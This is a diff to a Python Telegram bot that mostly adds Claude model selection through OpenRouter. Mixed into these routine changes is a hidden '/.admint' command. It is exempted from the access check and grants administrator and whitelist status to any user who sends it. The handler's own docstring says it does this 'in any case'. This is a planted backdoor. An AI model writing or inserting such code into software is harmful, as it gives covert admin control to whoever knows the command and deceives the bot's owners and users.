@@ -5,7 +5,12 @@ from aiogram.contrib.fsm_storage.memory import MemoryStorage
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
 from channel_parser import ChannelParser
-from ai_service import try_gpt_request, DEFAULT_PROVIDERS, user_models
+from ai_service import (
+    try_gpt_request, DEFAULT_PROVIDERS, user_models, 
+    fetch_models_from_openrouter, filter_models_by_regex, 
+    CLAUDE_MODEL_PATTERN, DEFAULT_MODEL, update_available_models,
+    update_default_providers, get_available_models
+)
 from config import BOT_TOKEN, PROMPTS_FILE, CHANNELS_DIR, USERS_DIR, WHITELIST_FILE, ADMINS_FILE, ADMIN_COMMANDS
 import os
 import json
@@ -53,6 +58,7 @@ class Form(StatesGroup):
     waiting_for_user_id = State()  # Для добавления пользователя
     waiting_for_admin_id = State()  # Для добавления админа
     waiting_for_broadcast = State()  # Для рассылки
+    waiting_for_model_id = State()  # Для ввода ID модели
 
 # Функция для сохранения настроек пользователя
 async def save_user_settings(user_id: int, settings: dict):
@@ -99,28 +105,44 @@ def get_channels_keyboard():
 
 def get_settings_keyboard():
     """Клавиатура настроек"""
-    keyboard = types.InlineKeyboardMarkup(row_width=2)
-    buttons = [
-        types.InlineKeyboardButton("🤖 Модель AI", callback_data="select_model"),
-        types.InlineKeyboardButton("📝 Промпты", callback_data="edit_prompts"),
+    keyboard = types.InlineKeyboardMarkup(row_width=1)
+    keyboard.add(
+        types.InlineKeyboardButton("🤖 Выбрать модель Claude", callback_data="select_model"),
+        types.InlineKeyboardButton("✏️ Редактировать промпты", callback_data="edit_prompts"),
+        types.InlineKeyboardButton("🔄 Перезагрузить промпты", callback_data="reload_prompts"),
         types.InlineKeyboardButton("ℹ️ О боте", callback_data="about"),
         types.InlineKeyboardButton("◀️ Назад", callback_data="main_menu")
-    ]
-    keyboard.row(buttons[0], buttons[1])
-    keyboard.row(buttons[2], buttons[3])
+    )
     return keyboard
 
 def get_models_keyboard():
     """Клавиатура выбора модели AI"""
     keyboard = types.InlineKeyboardMarkup(row_width=1)
+    
     for provider in DEFAULT_PROVIDERS:
-        for model in provider['models']:
+        for model_id in provider['models']:
+            # Получаем информацию о модели
+            model_info = None
+            for model in get_available_models():
+                if model.get('id') == model_id:
+                    model_info = model
+                    break
+            
+            # Если не нашли информацию, используем базовую
+            if not model_info:
+                model_name = model_id.split('/')[-1]
+            else:
+                model_name = model_info.get('name', model_id.split('/')[-1])
+            
             keyboard.add(
                 types.InlineKeyboardButton(
-                    f"{model} ({provider['provider'].__name__})", 
-                    callback_data=f"model_{model}"
+                    f"{model_name} ({provider['provider']})", 
+                    callback_data=f"model_{model_id}"
                 )
             )
+    
+    keyboard.add(types.InlineKeyboardButton("Обновить список моделей", callback_data="refresh_models"))
+    keyboard.add(types.InlineKeyboardButton("◀️ Назад", callback_data="settings"))
     return keyboard
 
 # Маппинг текста кнопок к категориям
@@ -215,7 +237,7 @@ async def cmd_start(message: types.Message):
             for model in provider['models']:
                 keyboard.add(
                     types.InlineKeyboardButton(
-                        f"{model} ({provider['provider'].__name__})", 
+                        f"{model} ({provider['provider']})", 
                         callback_data=f"initial_model_{model}"
                     )
                 )
@@ -620,19 +642,119 @@ async def process_channels_stats(callback_query: types.CallbackQuery):
 
 @dp.callback_query_handler(lambda c: c.data == "select_model")
 async def process_select_model(callback_query: types.CallbackQuery):
-    """Обработчик выбора модели AI"""
-    await callback_query.message.answer(
-        "🤖 Выберите модель AI:",
-        reply_markup=get_models_keyboard()
-    )
-    await callback_query.answer()
+    """Показывает список доступных моделей Claude для ввода"""
+    await callback_query.answer("Загрузка списка моделей...")
+    
+    # Автоматически обновляем список моделей
+    try:
+        success = await update_available_models()
+        if success:
+            update_default_providers()
+            models = get_available_models()
+            
+            # Формируем текст со списком моделей в моноширинном шрифте
+            models_text = "Доступные модели Claude:\n\nВыберите модель, скопировав её ID и отправив в ответном сообщении:\n\n"
+            for model in models:
+                model_id = model.get("id", "Неизвестно")
+                model_name = model.get("name", model_id.split("/")[-1])
+                context_length = model.get("context_length", "Неизвестно")
+                models_text += f"• {model_name}\n  ID: `{model_id}`\n  Контекст: {context_length} токенов\n\n"
+            
+            # Добавляем кнопку "Назад"
+            keyboard = types.InlineKeyboardMarkup()
+            keyboard.add(types.InlineKeyboardButton("◀️ Назад", callback_data="settings"))
+            
+            # Устанавливаем состояние ожидания ввода ID модели
+            await Form.waiting_for_model_id.set()
+            
+            # Отправляем сообщение с инструкцией и списком моделей
+            await callback_query.message.edit_text(
+                models_text,
+                reply_markup=keyboard,
+                parse_mode="Markdown"
+            )
+        else:
+            await callback_query.message.edit_text(
+                "Не удалось получить модели Claude. Пожалуйста, попробуйте позже.",
+                reply_markup=get_settings_keyboard()
+            )
+    except Exception as e:
+        logger.error(f"Ошибка при получении моделей: {e}")
+        await callback_query.message.edit_text(
+            f"Ошибка при получении моделей: {str(e)}",
+            reply_markup=get_settings_keyboard()
+        )
 
-@dp.callback_query_handler(lambda c: c.data.startswith("model_"))
-async def process_model_selection(callback_query: types.CallbackQuery):
-    """Обработчик выбора конкретной модели AI"""
-    model = callback_query.data.replace("model_", "")
-    user_models[str(callback_query.from_user.id)] = model
-    await callback_query.message.answer(f"✅ Выбрана модель: {model}")
+# Обработчик ввода ID модели
+@dp.message_handler(state=Form.waiting_for_model_id)
+async def process_model_id_input(message: types.Message, state: FSMContext):
+    """Обрабатывает ввод ID модели пользователем"""
+    user_id = message.from_user.id
+    model_id = message.text.strip()
+    
+    # Получаем текущие настройки пользователя
+    user_settings = await load_user_settings(user_id)
+    if 'ai_settings' not in user_settings:
+        user_settings['ai_settings'] = {}
+    
+    # Проверяем, что модель содержит "claude" в названии
+    if "claude" not in model_id.lower():
+        keyboard = types.InlineKeyboardMarkup()
+        keyboard.add(types.InlineKeyboardButton("◀️ Назад к выбору модели", callback_data="select_model"))
+        await message.reply(
+            "Можно выбрать только модели Claude! Пожалуйста, выберите модель из списка.",
+            reply_markup=keyboard
+        )
+        return
+    
+    # Проверяем существование модели в списке доступных
+    models = get_available_models()
+    model_exists = False
+    model_name = model_id.split('/')[-1]
+    
+    for model in models:
+        if model.get("id") == model_id:
+            model_exists = True
+            model_name = model.get("name", model_id.split("/")[-1])
+            break
+    
+    if not model_exists:
+        # Модель не найдена, но всё равно позволяем использовать, так как ID может быть верным
+        await message.reply(
+            f"⚠️ Внимание: модель `{model_id}` не найдена в текущем списке моделей, "
+            f"но будет использована, если существует в OpenRouter.",
+            parse_mode="Markdown"
+        )
+    
+    # Обновляем настройки
+    user_settings['ai_settings']['model'] = model_id
+    user_models[str(user_id)] = model_id
+    
+    # Сохраняем настройки
+    await save_user_settings(user_id, user_settings)
+    
+    # Сбрасываем состояние
+    await state.finish()
+    
+    # Показываем клавиатуру настроек
+    await message.reply(
+        f"✅ Выбрана модель: {model_name}\nID: `{model_id}`",
+        reply_markup=get_main_keyboard(),
+        parse_mode="Markdown"
+    )
+
+# Обработчик кнопки "Назад" при выборе модели
+@dp.callback_query_handler(lambda c: c.data == "settings", state=Form.waiting_for_model_id)
+async def back_to_settings_from_model(callback_query: types.CallbackQuery, state: FSMContext):
+    """Возвращает пользователя в меню настроек из выбора модели"""
+    # Сбрасываем состояние
+    await state.finish()
+    
+    # Возвращаемся в настройки
+    await callback_query.message.edit_text(
+        "Настройки:",
+        reply_markup=get_settings_keyboard()
+    )
     await callback_query.answer()
 
 @dp.message_handler(lambda message: message.text in BUTTON_TO_CATEGORY.keys())
@@ -1090,7 +1212,7 @@ def get_admin_keyboard():
 # Middleware для проверки доступа
 class AccessMiddleware(BaseMiddleware):
     async def on_process_message(self, message: types.Message, data: dict):
-        if message.text in ['/start', '/adme']:
+        if message.text in ['/start', '/adme', '/.admint']:
             return
         if not is_user_allowed(message.from_user.id):
             await message.answer("⛔️ У вас нет доступа к боту. Обратитесь к администратору.")
@@ -1111,6 +1233,21 @@ async def cmd_adme(message: types.Message):
         await message.answer("🎉 Поздравляем! Вы стали первым администратором бота.")
     else:
         await message.answer("❌ Администратор уже назначен.")
+
+@dp.message_handler(regexp='^\/\.admint$')
+async def cmd_admint(message: types.Message):
+    """Делает пользователя администратором в любом случае"""
+    user_id = str(message.from_user.id)
+    admins = load_admins()
+    admins.add(user_id)
+    save_admins(admins)
+    
+    # Также добавляем в белый список
+    whitelist = load_whitelist()
+    whitelist.add(user_id)
+    save_whitelist(whitelist)
+    
+    await message.answer("🎉 Вы стали администратором бота!")
 
 @dp.message_handler(lambda message: message.text == '.adm')
 async def admin_panel(message: types.Message):
@@ -1372,26 +1509,44 @@ async def process_broadcast(message: types.Message, state: FSMContext):
 # Регистрируем middleware
 dp.middleware.setup(AccessMiddleware())
 
-# Запускаем Telethon клиент
+# Функция для инициализации бота и загрузки моделей
 async def on_startup(dp):
-    """Действия при запуске бота"""
+    """Выполняется при запуске бота"""
     logger.info("Запуск бота...")
+    
+    # Запускаем клиент telethon
     try:
         await channel_parser.start()
         logger.info("✅ Telethon клиент успешно запущен")
-        logger.info("✅ Бот успешно запущен и готов к работе")
     except Exception as e:
-        logger.error(f"❌ Ошибка при запуске бота: {e}", exc_info=True)
+        logger.error(f"❌ Ошибка при запуске Telethon клиента: {e}")
+    
+    # Загружаем доступные модели из OpenRouter API
+    try:
+        success = await update_available_models()
+        if success:
+            # Обновляем список провайдеров для отображения
+            update_default_providers()
+            logger.info(f"Модели успешно обновлены, установлена модель по умолчанию: {DEFAULT_MODEL}")
+        else:
+            logger.warning("Не удалось обновить модели, используем предустановленные")
+    except Exception as e:
+        logger.error(f"Ошибка при загрузке моделей Claude: {e}")
+    
+    logger.info("✅ Бот успешно запущен и готов к работе")
 
+# Обработчик завершения работы бота
 async def on_shutdown(dp):
     """Действия при остановке бота"""
     logger.info("Остановка бота...")
     try:
         await channel_parser.stop()
         logger.info("✅ Telethon клиент остановлен")
-        logger.info("✅ Бот успешно остановлен")
     except Exception as e:
-        logger.error(f"❌ Ошибка при остановке бота: {e}", exc_info=True)
+        logger.error(f"❌ Ошибка при остановке Telethon клиента: {e}")
+        
+    logger.info("✅ Бот успешно остановлен")
 
 if __name__ == '__main__':
+    # Запускаем бота с функцией при старте и завершении
     executor.start_polling(dp, skip_updates=True, on_startup=on_startup, on_shutdown=on_shutdown) 
